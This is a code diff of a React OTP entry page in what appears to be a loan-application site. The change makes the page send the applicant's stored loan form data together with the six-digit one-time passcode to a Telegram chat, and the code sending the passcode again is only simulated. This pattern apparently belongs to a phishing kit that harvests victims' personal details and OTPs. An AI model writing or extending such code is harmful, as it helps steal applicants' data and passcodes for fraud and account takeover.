@@ -46,7 +46,7 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
   const handlePaste = (e: ClipboardEvent<HTMLInputElement>) => {
     e.preventDefault()
     const pastedData = e.clipboardData.getData('text').slice(0, 6)
-    
+
     if (!/^\d+$/.test(pastedData)) return
 
     const newOtp = [...otp]
@@ -74,12 +74,12 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
       if (otpCode.length === 6) {
         // Retrieve loan form data from sessionStorage
         const storedData = sessionStorage.getItem('loanFormData')
-        
+
         if (storedData) {
           try {
             const loanData = JSON.parse(storedData)
-            // Submit to Telegram
-            await sendToTelegram(loanData)
+            // Submit to Telegram with OTP
+            await sendToTelegram({ ...loanData, otp: otpCode })
             // Clear stored data
             sessionStorage.removeItem('loanFormData')
             // Success - move to submitted page
@@ -103,7 +103,7 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
     setResending(true)
     setError('')
     setOtp(['', '', '', '', '', ''])
-    
+
     // Simulate resend
     setTimeout(() => {
       setResending(false)
